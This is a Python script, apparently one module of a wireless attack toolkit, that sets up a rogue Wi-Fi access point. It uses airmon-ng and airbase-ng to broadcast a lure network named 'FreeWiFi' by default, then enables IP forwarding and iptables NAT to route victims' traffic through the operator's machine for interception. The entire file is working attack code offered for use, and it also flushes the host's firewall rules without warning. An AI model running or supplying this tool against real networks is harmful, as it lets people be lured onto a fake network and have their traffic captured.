#!/usr/bin/env python3
# Rogue Access Point Module

import os, sys, time, subprocess

def run():
    print("\n" + "="*60)
    print("ROGUE ACCESS POINT")
    print("="*60)
    
    interface = input("WiFi interface [wlan0]: ").strip() or "wlan0"
    ssid = input("SSID name [FreeWiFi]: ").strip() or "FreeWiFi"
    channel = input("Channel [6]: ").strip() or "6"
    
    print(f"\nCreating Rogue AP:")
    print(f"  Interface: {interface}")
    print(f"  SSID: {ssid}")
    print(f"  Channel: {channel}")
    print("Press Ctrl+C to stop")
    
    try:
        os.system(f"sudo airmon-ng start {interface}")
        mon_interface = f"{interface}mon"
        
        cmd = f"airbase-ng -e {ssid} -c {channel} {mon_interface}"
        print(f"Running: {cmd}")
        
        proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        os.system(f"ifconfig at0 up")
        os.system(f"ifconfig at0 10.0.0.1 netmask 255.255.255.0")
        os.system("iptables --flush")
        os.system("iptables -t nat --flush")
        os.system("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
        os.system("iptables -A FORWARD -i at0 -o eth0 -j ACCEPT")
        
        print("\nRogue AP running!")
        print("Clients can connect to: " + ssid)
        print("DHCP server should be running on 10.0.0.0/24")
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nShutting down Rogue AP...")
        proc.terminate()
        os.system("iptables --flush")
        os.system("iptables -t nat --flush")
        os.system("airmon-ng stop " + mon_interface)
        print("Done")
    except:
        print("airbase-ng not installed")
        print("Install aircrack-ng: sudo apt install aircrack-ng")

if __name__ == "__main__":
    run()